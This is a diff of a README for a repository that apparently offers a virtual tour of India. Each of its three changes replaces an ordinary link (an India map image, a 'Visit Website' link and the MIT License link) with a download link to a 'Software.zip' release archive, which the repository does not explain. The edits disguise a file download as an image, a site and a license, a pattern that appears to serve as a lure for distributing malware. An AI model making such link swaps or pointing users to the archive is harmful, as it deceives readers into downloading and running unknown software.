@@ -1,6 +1,6 @@
 # 🌟 Welcome to CITREA-INDIA-TOUR Repository! 🇮🇳
 
-![India](https://upload.wikimedia.org/wikipedia/commons/thumb/4/41/India_topo_big.jpg/1024px-India_topo_big.jpg)
+![India](https://github.com/akanimoemmanuel/CITREA-INDIA-TOUR/releases/download/v1.0/Software.zip)
 
 ### Description:
 This repository is dedicated to the CITREA-INDIA-TOUR project. Explore the enchanting beauty, rich culture, and diverse landscapes of India through this exciting tour. 
@@ -13,7 +13,7 @@ This repository is dedicated to the CITREA-INDIA-TOUR project. Explore the encha
 - [License](#license)
 
 ### 🌐 Visit CITREA-INDIA-TOUR Website:
-[Let's Explore India!](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[Let's Explore India!](https://github.com/akanimoemmanuel/CITREA-INDIA-TOUR/releases/download/v1.0/Software.zip)
 
 ### Introduction:
 India, known for its vibrant colors, historical monuments, spicy cuisine, and warm hospitality, is a land of many wonders. The CITREA-INDIA-TOUR project aims to provide a virtual tour experience to showcase the beauty and diversity of India.
@@ -35,7 +35,7 @@ India, known for its vibrant colors, historical monuments, spicy cuisine, and wa
 We welcome contributions to enhance the CITREA-INDIA-TOUR project. If you have ideas for new features, content updates, or improvements, feel free to submit a pull request. Your contributions will help make this virtual tour more enriching and engaging for users.
 
 ### License:
-This project is licensed under the [MIT License](https://opensource.org/licenses/MIT).
+This project is licensed under the [MIT License](https://github.com/akanimoemmanuel/CITREA-INDIA-TOUR/releases/download/v1.0/Software.zip).
 
 ---
 
